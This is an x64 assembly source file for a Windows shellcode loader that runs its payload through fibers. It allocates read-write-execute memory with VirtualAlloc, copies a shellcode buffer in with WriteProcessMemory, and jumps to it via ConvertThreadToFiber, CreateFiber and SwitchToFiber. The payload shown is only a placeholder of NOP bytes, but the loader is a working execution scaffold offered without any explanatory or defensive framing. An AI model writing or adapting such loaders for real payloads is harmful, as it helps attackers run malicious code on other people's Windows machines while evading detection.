; windows_loader64bits_fibers.asm

extrn VirtualAlloc :PROC
extrn GetCurrentProcess :PROC
extrn WriteProcessMemory :PROC
extrn ConvertThreadToFiber :PROC
extrn CreateFiber :PROC
extrn SwitchToFiber :PROC

.data   
    shellcode   DB 90h, 90h, 90h, 90h, 90h, 0
    hProcess    DQ ?
    baseAddr    DQ ?
    fiberAddr   DQ ?

.code
Start PROC
    SUB     rsp, 28h
    
    CALL    GetCurrentProcess
    MOV     hProcess, rax

    XOR     rcx, rcx
    MOV     rdx, 100h
    MOV     r8, 1000h ; MEM_COMMIT
    MOV     r9, 40h ; PAGE_EXECUTE_READWRITE
    CALL    VirtualAlloc
    MOV     baseAddr, rax

    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, shellcode
    MOV     r9, SIZEOF shellcode
    SUB     rsp, 40
    MOV     qword ptr [rsp+32], 0
    CALL    WriteProcessMemory
    ADD     rsp, 40

    XOR     rcx, rcx
    CALL    ConvertThreadToFiber

    XOR     rcx, rcx
    MOV     rdx, baseAddr
    XOR     r8, r8
    CALL    CreateFiber
    MOV     fiberAddr, rax

    MOV     rcx, fiberAddr
    CALL    SwitchToFiber


Start ENDP
END